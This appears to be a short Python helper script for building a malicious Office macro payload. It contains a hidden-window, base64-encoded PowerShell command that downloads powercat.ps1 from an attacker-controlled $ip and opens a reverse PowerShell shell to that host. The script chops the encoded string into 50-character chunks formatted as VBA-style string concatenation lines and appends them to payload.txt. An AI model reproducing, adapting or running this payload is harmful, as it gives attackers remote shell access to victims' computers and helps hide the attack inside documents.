str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AJABpAHAALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAiACkAOwBwAG8AdwBlAHIAYwBhAHQAIAAtAGMAIAAkAGkAcAAgAC0AcAAgACQAcABvAHIAdAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwACgA="
n=50
for i in range(0,len(str),n):
   with open("payload.txt", "a") as f:
      f.write("Str = str+" + '"' + str[i:i+n] +'"\n')
      #Add a new line
   # py write to file
